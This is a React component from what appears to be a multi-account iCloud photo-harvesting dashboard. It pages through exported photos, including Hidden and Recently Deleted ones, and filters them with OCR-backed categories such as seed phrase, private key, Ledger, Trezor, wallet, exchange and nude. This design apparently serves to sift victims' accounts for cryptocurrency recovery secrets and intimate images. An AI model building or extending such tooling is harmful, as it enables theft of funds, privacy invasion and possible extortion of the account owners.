import { useCallback, useEffect, useRef, useState } from "react";
import { accountUrl, bytes, getJson, thumbUrl } from "./api.js";
import { Empty, Spinner, displayName } from "./ui.jsx";
import Lightbox from "./Lightbox.jsx";
import RetryImage from "./RetryImage.jsx";

const BASE_AREAS = ["All", "Library", "Hidden", "Recently Deleted", "Drive"];
const KINDS = [
  ["", "Any type"],
  ["seed", "Seed phrase"],
  ["seed-candidate", "Seed candidate"],
  ["crypto", "Crypto"],
  ["ledger", "Ledger"],
  ["trezor", "Trezor"],
  ["wallet", "Wallet"],
  ["recover", "Recover / restore"],
  ["safe", "Safe (multisig)"],
  ["secret", "Secret"],
  ["privatekey", "Private key"],
  ["backup", "Backup"],
  ["exchange", "Exchange"],
  ["screenshot", "Screenshot"],
  ["text", "Text"],
  ["document", "Document"],
  ["receipt", "Receipt"],
  ["nude", "Nude"],
  ["selfie", "Selfie"],
  ["person", "Person"],
  ["photo", "Photo"],
  ["meme", "Meme"],
  ["other", "Other"],
];
const PAGE_SIZE = 100; // infinite scroll: 100 tiles per request

export default function PhotosTab({ account }) {
  const [areas, setAreas] = useState(BASE_AREAS);
  const [area, setArea] = useState("All");
  const [kind, setKind] = useState("");
  const [kindCounts, setKindCounts] = useState({});
  const [text, setText] = useState("");
  const [query, setQuery] = useState("");
  const [items, setItems] = useState([]);
  const [total, setTotal] = useState(0);
  const [hasMore, setHasMore] = useState(false);
  const [loading, setLoading] = useState(true);
  const [loadingMore, setLoadingMore] = useState(false);
  const [error, setError] = useState("");
  const [open, setOpen] = useState(null);
  const [failed, setFailed] = useState({});
  const [retryTick, setRetryTick] = useState(0);
  const [tick, setTick] = useState(0);
  const pageRef = useRef(0);
  const busyRef = useRef(false);
  const sentinelRef = useRef(null);
  const scrollRef = useRef(null);

  const loadPage = useCallback(
    async (next) => {
      if (busyRef.current) return;
      busyRef.current = true;
      if (next <= 1) setLoading(true);
      else setLoadingMore(true);
      setError("");
      try {
        const result = await getJson(
          accountUrl(account.id, "gallery", {
            area,
            q: query,
            kind,
            page: next,
            pageSize: PAGE_SIZE,
          })
        );
        const incoming = Array.isArray(result.items) ? result.items : [];
        setItems((previous) => {
          if (next <= 1) return incoming;
          const seen = new Set(previous.map((item) => item.path));
          return [...previous, ...incoming.filter((item) => !seen.has(item.path))];
        });
        setTotal(result.total);
        if (result.kindCounts) setKindCounts(result.kindCounts);
        setHasMore(next < (result.pages ?? 1));
        pageRef.current = next;
      } catch (failure) {
        setError(failure.message);
      } finally {
        busyRef.current = false;
        setLoading(false);
        setLoadingMore(false);
      }
    },
    [account.id, area, query, kind]
  );

  // The exporter writes each photo as soon as it is downloaded.  While an
  // export is running, refresh the head of the list so new files appear.
  useEffect(() => {
    if (account.export?.phase !== "running") return;
    const timer = setInterval(() => setTick((value) => value + 1), 30000);
    return () => clearInterval(timer);
  }, [account.export?.phase]);

  useEffect(() => {
    let alive = true;
    getJson(accountUrl(account.id, "tree", { path: "Photos" }))
      .then((result) => {
        if (!alive) return;
        const names = (result.dirs || []).map((dir) => dir.name);
        setAreas([...new Set([...BASE_AREAS, ...names])]);
      })
      .catch(() => {});
    return () => {
      alive = false;
    };
  }, [account.id]);

  useEffect(() => {
    const timer = setTimeout(() => setQuery(text.trim()), 250);
    return () => clearTimeout(timer);
  }, [text]);

  useEffect(() => {
    scrollRef.current = document.getElementById("account-scroll");
    return () => {
      scrollRef.current = null;
    };
  }, []);

  // New area / filter: start over.
  useEffect(() => {
    setItems([]);
    setTotal(0);
    setHasMore(false);
    setOpen(null);
    setFailed({});
    pageRef.current = 0;
    busyRef.current = false;
    scrollRef.current?.scrollTo({ top: 0 });
    loadPage(1);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [account.id, area, query]);

  // A refresh tick reloads the first page and merges it into the head.
  useEffect(() => {
    if (!tick) return;
    let alive = true;
    getJson(accountUrl(account.id, "gallery", { area, q: query, page: 1, pageSize: PAGE_SIZE }))
      .then((result) => {
        if (!alive) return;
        setItems((previous) => {
          if (previous.length <= PAGE_SIZE) return result.items;
          const seen = new Set(result.items.map((item) => item.path));
          return [...result.items, ...previous.filter((item) => !seen.has(item.path))];
        });
        setTotal(result.total);
      })
      .catch(() => {});
    return () => {
      alive = false;
    };
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [tick]);

  // Infinite scroll: 100 more images each time the sentinel is reached.
  useEffect(() => {
    const target = sentinelRef.current;
    if (!target) return undefined;
    const root = scrollRef.current;
    const observer = new IntersectionObserver(
      (entries) => {
        if (!entries.some((entry) => entry.isIntersecting)) return;
        if (busyRef.current) return;
        if (pageRef.current > 0 && hasMore) loadPage(pageRef.current + 1);
      },
      { root, rootMargin: "900px 0px", threshold: 0 }
    );
    observer.observe(target);
    return () => observer.disconnect();
  }, [hasMore, loadPage]);

  function next() {
    if (open === null) return;
    if (open + 1 < items.length) {
      setOpen(open + 1);
    } else if (hasMore) {
      loadPage(pageRef.current + 1).then(() => setOpen((value) => value + 1));
    } else {
      setOpen(0);
    }
  }

  function prev() {
    if (open === null) return;
    if (open > 0) setOpen(open - 1);
    else setOpen(items.length - 1);
  }

  return (
    <div>
      <div className="flex flex-wrap items-center gap-2">
        <div className="flex flex-wrap gap-1.5">
          {areas.map((name) => (
            <button
              key={name}
              type="button"
              onClick={() => setArea(name)}
              className={`h-8 rounded-full px-3 text-[12px] font-medium ${
                area === name
                  ? "bg-[#1d1d1f] text-white"
                  : "border border-[#d2d2d7] bg-white text-[#424245] hover:bg-[#fafafa]"
              }`}
            >
              {name}
            </button>
          ))}
        </div>
        <select
          value={kind}
          onChange={(event) => setKind(event.target.value)}
          title="Image type"
          className="h-8 rounded-[8px] border border-[#d2d2d7] bg-white px-2 text-[12px]"
        >
          {KINDS.map(([id, label]) => (
            <option key={id} value={id}>
              {label}
              {id && kindCounts[id] ? ` (${kindCounts[id]})` : ""}
            </option>
          ))}
        </select>
        <div className="ml-auto flex items-center gap-2">
          <input
            value={text}
            onChange={(event) => setText(event.target.value)}
            placeholder="Filter by filename…"
            className="h-8 w-[230px] rounded-[8px] border border-[#d2d2d7] bg-white px-3 text-[12px] outline-none focus:border-[#0071e3]"
          />
          <span className="text-[12px] text-[#6e6e73]">
            {total ? `${items.length.toLocaleString()} of ${total.toLocaleString()}` : "0"}
          </span>
        </div>
      </div>

      {error ? (
        <p className="mt-3 rounded-[9px] bg-[#fff2f2] px-3 py-2 text-[12px] text-[#c4000a]">{error}</p>
      ) : null}

      {loading && !items.length ? (
        <Spinner label="Loading photos" />
      ) : items.length ? (
        <div className="mt-3 grid grid-cols-2 gap-2 sm:grid-cols-3 lg:grid-cols-5 xl:grid-cols-6">
          {items.map((item, index) => (
            <button
              key={item.path}
              type="button"
              onClick={() => setOpen(index)}
              style={{ contentVisibility: "auto", containIntrinsicSize: "230px" }}
              className="group overflow-hidden rounded-[10px] border border-[#e5e5ea] bg-white text-left transition hover:border-[#0071e3] hover:shadow-[0_4px_16px_rgba(0,0,0,0.08)]"
            >
              <div className="relative aspect-square bg-[#f5f5f7]">
                {failed[item.path] ? (
                  <button
                    type="button"
                    onClick={(event) => {
                      event.stopPropagation();
                      setFailed((previous) => {
                        const next = { ...previous };
                        delete next[item.path];
                        return next;
                      });
                      setRetryTick((value) => value + 1);
                    }}
                    className="flex h-full w-full flex-col items-center justify-center gap-1 text-[22px] text-[#6e6e73] hover:bg-[#efeff2]"
                    title="Load this image again"
                  >
                    <span>🖼</span>
                    <span className="text-[9px] font-medium uppercase tracking-[0.05em]">retry</span>
                  </button>
                ) : (
                  <RetryImage
                    key={`${item.path}-${retryTick}`}
                    loading="lazy"
                    decoding="async"
                    src={thumbUrl(account.id, item.path, item.mtime)}
                    fallbackSrc={thumbUrl(account.id, item.path, item.mtime)}
                    alt={item.name}
                    onFail={() =>
                      setFailed((previous) => ({ ...previous, [item.path]: true }))
                    }
                    className="h-full w-full object-cover"
                  />
                )}
                {item.video ? (
                  <span className="absolute inset-0 flex items-center justify-center">
                    <span className="flex h-9 w-9 items-center justify-center rounded-full bg-black/55 text-[13px] text-white">
                      ▶
                    </span>
                  </span>
                ) : null}
                {item.mtime && Date.now() - Number(item.mtime) < 10 * 60 * 1000 ? (
                  <span className="absolute bottom-1 right-1 rounded bg-[#0071e3] px-1 text-[9px] font-medium text-white">
                    NEW
                  </span>
                ) : null}
                {area === "All" && item.area ? (
                  <span className="absolute left-1 top-1 rounded bg-black/60 px-1 text-[9px] text-white">
                    {item.area}
                  </span>
                ) : null}
                {!item.video && item.ocr === false ? (
                  <span className="absolute bottom-1 left-1 rounded bg-[#ff9f0a]/90 px-1 text-[9px] font-medium text-white">
                    OCR pending
                  </span>
                ) : null}
                {item.kind ? (
                  <span className="absolute bottom-1 left-1 rounded bg-black/70 px-1 text-[9px] font-semibold uppercase tracking-[0.03em] text-white">
                    {item.kind}
                  </span>
                ) : null}
              </div>
              <div className="px-2 py-1.5">
                <div className="truncate text-[11px] font-medium text-[#1d1d1f]" title={item.name}>
                  {displayName(item.name)}
                </div>
                <div className="text-[10px] text-[#6e6e73]">{bytes(item.size)}</div>
              </div>
            </button>
          ))}
          <div ref={sentinelRef} className="col-span-full h-1" />
        </div>
      ) : (
        <div className="mt-4">
          <Empty title={query ? "No photo matches that name" : "No photos in this area yet"}>
            {query
              ? "Try a shorter fragment, or use Search for text found inside images (OCR)."
              : `${(Number(account.counts?.photos) || 0).toLocaleString()} in iCloud · 0 downloaded. Run Export missing, then come back. All / Library / Hidden / Recently Deleted are separate views.`}
          </Empty>
        </div>
      )}

      {loadingMore ? (
        <div className="mt-4 flex items-center justify-center">
          <Spinner label="Loading 100 more" />
        </div>
      ) : hasMore ? (
        <div className="mt-4 flex justify-center">
          <button
            type="button"
            onClick={() => loadPage(pageRef.current + 1)}
            className="h-8 rounded-[8px] border border-[#d2d2d7] bg-white px-3 text-[12px]"
          >
            Load 100 more
          </button>
        </div>
      ) : items.length ? (
        <p className="mt-4 text-center text-[11px] text-[#6e6e73]">End of the list · {total.toLocaleString()} items</p>
      ) : null}

      {open !== null ? (
        <Lightbox
          accountId={account.id}
          items={items}
          index={open}
          setIndex={setOpen}
          onPrev={prev}
          onNext={next}
          onClose={() => setOpen(null)}
        />
      ) : null}
    </div>
  );
}
